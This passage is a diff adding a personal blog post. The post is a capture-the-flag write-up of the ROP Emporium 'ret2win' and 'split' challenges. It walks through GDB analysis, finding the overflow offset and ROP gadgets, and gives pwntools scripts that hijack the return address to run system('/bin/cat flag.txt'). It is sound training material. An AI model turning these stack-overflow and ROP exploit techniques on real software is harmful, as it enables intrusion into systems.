+	memset(buf,0,0x20);
+	puts(
+		"For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!"
+	);
+	puts("What could possibly go wrong?");
+	puts(
+		"You there, may I have your input please? And don\'t worry about null bytes, we\'re using read ()!\n"
+	);
+	printf("&gt; ");
+	read(0,buf,0x38);
+	puts("Thank you!");
+	return;
+}
+</code></pre>
+<p>Probably could’ve saved a minute or two if I had run the binary beforehand.</p>
+
+<p>It looks like we can write whatever we want deep into the stack, meaning we can likely overwrite the return address. But what address should we return to?</p>
+<pre><code class="language-GDB">gef➤  disas ret2win
+Dump of assembler code for function ret2win:
+   0x0000000000400756 &lt;+0&gt;:     push   rbp
+   0x0000000000400757 &lt;+1&gt;:     mov    rbp,rsp
+   0x000000000040075a &lt;+4&gt;:     mov    edi,0x400926
+   0x000000000040075f &lt;+9&gt;:     call   0x400550 &lt;puts@plt&gt;
+   0x0000000000400764 &lt;+14&gt;:    mov    edi,0x400943
+   0x0000000000400769 &lt;+19&gt;:    call   0x400560 &lt;system@plt&gt;
+   0x000000000040076e &lt;+24&gt;:    nop
+   0x000000000040076f &lt;+25&gt;:    pop    rbp
+   0x0000000000400770 &lt;+26&gt;:    ret
+End of assembler dump.
+gef➤
+</code></pre>
+<p>This looks likely, but what is the command that’s being run in the <code class="language-plaintext highlighter-rouge">system</code> call at <code class="language-plaintext highlighter-rouge">ret2in+14</code>?</p>
+<pre><code class="language-GDB">gef➤  x/s 0x400943
+0x400943:       "/bin/cat flag.txt"
+gef➤
+</code></pre>
+<p>That could work, looks like returning to <code class="language-plaintext highlighter-rouge">ret2win</code> will effectively run <code class="language-plaintext highlighter-rouge">/bin/cat flag.txt</code>. We can drop a break point at the <code class="language-plaintext highlighter-rouge">read</code> call with <code class="language-plaintext highlighter-rouge">b *(pwnme+92)</code>. We can then use <code class="language-plaintext highlighter-rouge">gef</code>’s <code class="language-plaintext highlighter-rouge">pattern create</code> function to figure out the correct offset:</p>
+<pre><code class="language-GDB">gef➤  pattern create
+[+] Generating a pattern of 1024 bytes (n=8)
+aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaaaaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaaezaaaaaafbaaaaaafcaaaaaaf
+[+] Saved as '$_gef0'
+gef➤
+</code></pre>
+<p>We can advance instructions until we reach the <code class="language-plaintext highlighter-rouge">ret</code> instruction, which will pop the top address of the stack, and move it to <code class="language-plaintext highlighter-rouge">rip</code>, changing what code is being executed next:</p>
+<pre><code class="language-GDB">0x00007fffffffded8│+0x0000: 0x6161616161616166   ← $rsp
+0x00007fffffffdee0│+0x0008: 0x6161616161616167
+0x00007fffffffdee8│+0x0010: 0x00007ffff7dfb6ca  →  &lt;__libc_start_call_main+122&gt; mov edi, eax
+0x00007fffffffdef0│+0x0018: 0x0000000000000000
+0x00007fffffffdef8│+0x0020: 0x0000000000400697  →  &lt;main+0&gt; push rbp
+0x00007fffffffdf00│+0x0028: 0x0000000100000000
+0x00007fffffffdf08│+0x0030: 0x00007fffffffdff8  →  0x00007fffffffe28d  →  "/home/jakemull/ctf/ROPEmporium/ret2win/ret2win"
+0x00007fffffffdf10│+0x0038: 0x00007fffffffdff8  →  0x00007fffffffe28d  →  "/home/jakemull/ctf/ROPEmporium/ret2win/ret2win"
+--------------------------------------------
+     0x400753 &lt;pwnme+107&gt;      nop
+     0x400754 &lt;pwnme+108&gt;      leave
+ →   0x400755 &lt;pwnme+109&gt;      ret
+--------------------------------------------
+[!] Cannot disassemble from $PC
+gef➤  pattern search $rsp
+[+] Searching for '6661616161616161'/'6161616161616166' with period=8
+[+] Found at offset 40 (little-endian search) likely
+gef➤
+</code></pre>
+<p>Given this, let’s steal some of my friend DeltaBlueJay’s pwntools code from <a href="https://deltabluejay.github.io/ninipwn">this</a> writeup to create a simple pwntools script:</p>
+<pre><code class="language-python3">from pwn import *
+  
+binary = './ret2win'
+elf = context.binary = ELF(binary, checksec=False)
+  
+gs = """
+b *(ret2win)
+"""
+  
+if args.GDB:
+    context.terminal = ["tmux", "splitw", "-h", "-l", "120"]
+    p = gdb.debug(binary, gdbscript=gs)
+else:
+    p = elf.process()
+</code></pre>
+
+<p>We need to get the address of <code class="language-plaintext highlighter-rouge">ret2win</code>:</p>
+<pre><code class="language-GDB">gef➤  info functions
+.
+.
+.
+0x0000000000400756  ret2win
+.
+gef➤
+</code></pre>
+
+<p>Let’s put this address into the script with the padding to create a payload:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">target_addr</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000400757</span><span class="p">)</span>
+<span class="n">padding</span> <span class="o">=</span> <span class="s">b"A"</span> <span class="o">*</span> <span class="mi">40</span>
+  
+<span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">target_addr</span>
+</code></pre></div></div>
+
+<p>Then, we can do some pipe magic to get the output:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">b"&gt; "</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+  
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>The final script is:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+  
+<span class="n">binary</span> <span class="o">=</span> <span class="s">'./ret2win'</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+  
+<span class="n">gs</span> <span class="o">=</span> <span class="s">"""
+b *(ret2win)
+"""</span>
+  
+<span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
+<span class="err"> </span> <span class="err"> </span> <span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">"tmux"</span><span class="p">,</span> <span class="s">"splitw"</span><span class="p">,</span> <span class="s">"-h"</span><span class="p">,</span> <span class="s">"-l"</span><span class="p">,</span> <span class="s">"120"</span><span class="p">]</span>
+<span class="err"> </span> <span class="err"> </span> <span class="n">p</span> <span class="o">=</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gs</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+<span class="err"> </span> <span class="err"> </span> <span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">process</span><span class="p">()</span>
+<span class="n">target_addr</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000400757</span><span class="p">)</span>
+<span class="n">padding</span> <span class="o">=</span> <span class="s">b"A"</span> <span class="o">*</span> <span class="mi">40</span>
+  
+<span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">target_addr</span>
+  
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">b"&gt; "</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+  
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h2 id="ret2winsplit">ret2win:split</h2>
+<p>We get a raw binary called <code class="language-plaintext highlighter-rouge">split</code>. It seems pretty similar to <code class="language-plaintext highlighter-rouge">ret2win</code>, but with the change that we need to pop a string into <code class="language-plaintext highlighter-rouge">rdi</code>, then call <code class="language-plaintext highlighter-rouge">system</code> in <code class="language-plaintext highlighter-rouge">usefulFunction</code>:</p>
+<pre><code class="language-C">void usefulFunction(void)
+{
+  system("/bin/ls");
+  return;
+}
+</code></pre>
+
+<p>We can poke through the binary to see if there is a place that we can steal a command from:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span>16:33<span class="o">}</span>~/ctf/ROPEmporium/split ➭ strings <span class="nb">split</span> | <span class="nb">grep</span> /
+/lib64/ld-linux-x86-64.so.2
+/bin/ls
+/bin/cat flag.txt
+<span class="o">{</span>16:35<span class="o">}</span>~/ctf/ROPEmporium/split ➭    
+</code></pre></div></div>
+
+<p>We can then use <code class="language-plaintext highlighter-rouge">ropper</code> to see if there is a gadget we can use to pop an address into <code class="language-plaintext highlighter-rouge">rdi</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span>16:35<span class="o">}</span>~/ctf/ROPEmporium/split ➭ ropper <span class="nt">-f</span> <span class="nb">split</span> | <span class="nb">grep </span>rdi
+<span class="o">[</span>INFO] Load gadgets from cache
+<span class="o">[</span>LOAD] loading... 100%
+<span class="o">[</span>LOAD] removing double gadgets... 100%
+0x00000000004006d4: add byte ptr <span class="o">[</span>rax], al<span class="p">;</span> add byte ptr <span class="o">[</span>rdi + 0x400806], bh<span class="p">;</span> call 0x550<span class="p">;</span> mov eax, 0<span class="p">;</span> pop rbp<span class="p">;</span> ret<span class="p">;</span>
+0x00000000004006d6: add byte ptr <span class="o">[</span>rdi + 0x400806], bh<span class="p">;</span> call 0x550<span class="p">;</span> mov eax, 0<span class="p">;</span> pop rbp<span class="p">;</span> ret<span class="p">;</span>
+0x00000000004007c3: pop rdi<span class="p">;</span> ret<span class="p">;</span>
+<span class="o">{</span>16:35<span class="o">}</span>~/ctf/ROPEmporium/split ➭
+</code></pre></div></div>
+
+<p>It looks like such a gadget exists at <code class="language-plaintext highlighter-rouge">0x004007c3</code>. We know that <code class="language-plaintext highlighter-rouge">rdi</code>?<code class="language-plaintext highlighter-rouge">edi</code> is the correct register to hold a reference to the command because it is typically the register for the first argument of a function, and we can disassemble <code class="language-plaintext highlighter-rouge">usefulFunction</code> to prove this:</p>
+<pre><code class="language-GDB">gef➤  disas usefulFunction
+Dump of assembler code for function usefulFunction:
+   0x0000000000400742 &lt;+0&gt;:     push   rbp
+   0x0000000000400743 &lt;+1&gt;:     mov    rbp,rsp
+   0x0000000000400746 &lt;+4&gt;:     mov    edi,0x40084a
+   0x000000000040074b &lt;+9&gt;:     call   0x400560 &lt;system@plt&gt;
+   0x0000000000400750 &lt;+14&gt;:    nop
+   0x0000000000400751 &lt;+15&gt;:    pop    rbp
+   0x0000000000400752 &lt;+16&gt;:    ret
+End of assembler dump.
+gef➤  x/s 0x40084a
+0x40084a:       "/bin/ls"
+gef➤
+</code></pre>
+
+<p>We also need to find the correct address for the command. We can use <code class="language-plaintext highlighter-rouge">objdump</code> to find the address of <code class="language-plaintext highlighter-rouge">/bin/cat flag.txt</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span>16:43<span class="o">}</span>~/ctf/ROPEmporium/split ➭ objdump <span class="nt">-s</span> <span class="nt">-j</span> .data <span class="nb">split
+
+split</span>:     file format elf64-x86-64
+
+Contents of section .data:
+ 601050 00000000 00000000 00000000 00000000  ................
+ 601060 2f62696e 2f636174 20666c61 672e7478  /bin/cat flag.tx
+ 601070 7400                                 t.
+<span class="o">{</span>16:44<span class="o">}</span>~/ctf/ROPEmporium/split ➭
+</code></pre></div></div>
+
+<p>It looks like the chain of attack should go:</p>
+<ol>
+  <li>Pop 0x000601060 into <code class="language-plaintext highlighter-rouge">rdi</code> using the gadget at 0x00004007c3. This means <code class="language-plaintext highlighter-rouge">rdi</code> stores a pointer to <code class="language-plaintext highlighter-rouge">/bin/cat flag.txt</code></li>
+  <li>Run <code class="language-plaintext highlighter-rouge">system</code> at <code class="language-plaintext highlighter-rouge">usefulFunction+9</code>/0x0040074b to run <code class="language-plaintext highlighter-rouge">system</code> with argument <code class="language-plaintext highlighter-rouge">/bin/cat flag.txt</code>.</li>
+</ol>
+
+<p>This is my first foray into using the <code class="language-plaintext highlighter-rouge">rop</code> functionality of <code class="language-plaintext highlighter-rouge">pwntools</code>. This is the current state of the attack script:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+  
+<span class="n">binary</span> <span class="o">=</span> <span class="s">'./split'</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+  
+<span class="n">gs</span> <span class="o">=</span> <span class="s">"""
+b *(pwnme+77)
+c
+"""</span>
+  
+<span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
+<span class="err"> </span> <span class="err"> </span> <span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">"tmux"</span><span class="p">,</span> <span class="s">"splitw"</span><span class="p">,</span> <span class="s">"-h"</span><span class="p">,</span> <span class="s">"-l"</span><span class="p">,</span> <span class="s">"120"</span><span class="p">]</span>
+<span class="err"> </span> <span class="err"> </span> <span class="n">p</span> <span class="o">=</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gs</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+<span class="err"> </span> <span class="err"> </span> <span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">process</span><span class="p">()</span>
+<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
+<span class="n">rop</span><span class="p">.</span><span class="n">call</span><span class="p">(</span><span class="s">'system'</span><span class="p">,</span> <span class="p">[</span><span class="mh">0x00601060</span><span class="p">])</span>
+<span class="k">print</span><span class="p">(</span><span class="n">rop</span><span class="p">.</span><span class="n">dump</span><span class="p">())</span>
+<span class="n">rop</span> <span class="o">=</span> <span class="n">rop</span><span class="p">.</span><span class="n">chain</span><span class="p">()</span>
+  
+<span class="n">address</span> <span class="o">=</span> <span class="mh">0x0040074b</span>
+  
+<span class="n">padding</span> <span class="o">=</span> <span class="s">b"A"</span> <span class="o">*</span> <span class="mi">40</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span><span class="o">+</span> <span class="n">rop</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">address</span><span class="p">)</span>
+  
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">b"&gt; "</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+<p>I would likely have finished this within an hour, but my self imposed time limit lapsed.</p>
+
+<h2 id="wrap-up">Wrap-up</h2>
+<p>Finishing these challenges, I’ve gotten much better with pwntools, particularly interacting with binaries.</p>
+
+
+        
+          <button title="Toggle Theme" class="theme-toggle">
+  <svg viewBox="0 0 32 32" width="24" height="24" fill="currentcolor">
+    <circle cx="16" cy="16" r="14" fill="none" stroke="currentcolor" stroke-width="4"></circle>
+    <path d="
+             M 16 0
+             A 16 16 0 0 0 16 32
+             z">
+    </path>
+  </svg>
+</button>
+
+        
+        <div class="credits">&copy;&nbsp;2024&nbsp;Jake Mullins
+          &nbsp;
+          •
+          &nbsp;Theme&nbsp; <a href="https://github.com/abhinavs/moonwalk" target="_blank" rel="noreferrer">Moonwalk</a>
+        </div>
+      </div>
+    </main></body>
+</html>
